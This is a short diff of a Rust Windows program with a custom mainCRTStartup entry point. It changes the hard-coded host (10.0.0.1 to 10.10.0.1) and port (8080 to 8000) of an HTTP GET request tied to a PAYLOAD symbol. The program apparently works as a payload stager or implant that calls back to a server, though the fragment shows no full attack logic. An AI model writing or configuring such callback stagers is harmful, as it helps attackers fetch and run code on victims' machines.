@@ -206,8 +206,8 @@ pub extern "system" fn mainCRTStartup() -> i32 {
     };
 
     let method = Utf16String::new("GET");
-    let ip_or_domain = Utf16String::new("10.0.0.1");
-    let port: u16 = 8080;
+    let ip_or_domain = Utf16String::new("10.10.0.1");
+    let port: u16 = 8000;
     let entry_id = core::ptr::addr_of!(PAYLOAD.0) as *const u16;
     unsafe{
 
